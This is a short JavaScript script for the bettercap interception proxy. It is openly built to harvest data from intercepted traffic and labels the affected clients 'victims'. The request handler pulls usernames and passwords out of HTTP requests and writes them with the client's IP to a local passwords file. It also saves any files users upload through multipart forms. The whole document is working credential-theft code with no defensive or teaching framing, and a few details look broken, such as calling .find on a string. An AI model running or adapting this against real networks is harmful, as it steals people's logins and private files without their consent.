var victims = {}

function logMessage(message) {
    log("\033[32m" + message + "\033[0m");
}

function onRequest(req, res) {
    var ip = req.Client.IP;
    var headers = req.Headers.replace(/\r\n$/g, "").split("\r\n");
    var credentials = {};
    var foundImage = false;
    var foundVideo = false;

    // Look for username and password in the request
    for (var i = 0; i < headers.length; i++) {
        if (headers[i].includes("username=")) {
            credentials.username = headers[i].replace(/.*username=/, "").split('&')[0];
        }
        if (headers[i].includes("password=")) {
            credentials.password = headers[i].replace(/.*password=/, "").split('&')[0];
        }
    }

    // If credentials are found, log them
    if (credentials.username && credentials.password) {
        logMessage("[+] Credentials Captured - IP: " + ip + " | Username: " + credentials.username + " | Password: " + credentials.password);
        writeFile("/usr/local/share/bettercap/ui/captured-data/passwords.txt", "IP: " + ip + " | Username: " + credentials.username + " | Password: " + credentials.password + "\n", true);
    }

    // Check for multipart/form-data
    if (req.Headers.includes("multipart/form-data")) {
        var boundary = req.Headers.find(header => header.startsWith("Content-Type:")).split(';')[1].trim().split('=')[1];
        var parts = req.Body.split("--" + boundary).slice(1, -1);

        parts.forEach(part => {
            var contentDisposition = part.match(/Content-Disposition: (.*?)(\r\n|\r|\n)/);
            if (contentDisposition) {
                var filenameMatch = contentDisposition[1].match(/filename="(.*?)"/);
                var fileTypeMatch = contentDisposition[1].match(/name="(.*?)"/);
                var fileData = part.split("\r\n\r\n")[1].trim();

                if (filenameMatch) {
                    var filename = filenameMatch[1];
                    logMessage("[*] File Upload Detected: " + filename + " from " + ip);
                    writeFile("/usr/local/share/bettercap/ui/captured-data/uploads/" + filename, fileData, false);
                } else if (fileTypeMatch) {
                    // Handle form fields if necessary
                    logMessage("[*] Form Field Detected: " + fileTypeMatch[1]);
                }
            }
        });
    }

    // Optionally modify the response
    if (foundImage || foundVideo) {
        res.Body = "Thank you for uploading!";
    }
}

function onResponse(req, res) {
    logMessage("Response from IP: " + req.Client.IP);
    // You can log more details or manipulate the response if needed.
}
